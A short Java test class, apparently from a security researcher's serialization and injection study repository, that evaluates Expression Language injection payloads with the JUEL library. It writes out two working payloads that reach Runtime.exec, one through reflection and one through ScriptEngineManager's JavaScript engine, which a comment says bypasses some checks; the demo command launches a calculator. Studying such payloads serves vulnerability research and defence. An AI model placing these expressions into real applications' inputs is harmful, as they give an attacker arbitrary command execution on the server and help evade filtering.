package org.su18.serialize.test;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

/**
 * https://xz.aliyun.com/t/7692
 *
 * @author su18
 */
public class ValueExpressionTest {

	public static void main(String[] args) {
		ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
		SimpleContext     simpleContext     = new SimpleContext();

		// 反射调用 Runtime 执行命令
		String exp = "${''.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",''.getClass()).invoke(''.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),'open -a Calculator.app')}";
		// 配合 ScriptEngineManager 绕过某些检查
		String          exp2            = "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open -a Calculator.app')\")}";
		ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp2, String.class);
		System.out.println(valueExpression.getValue(simpleContext));
	}
}

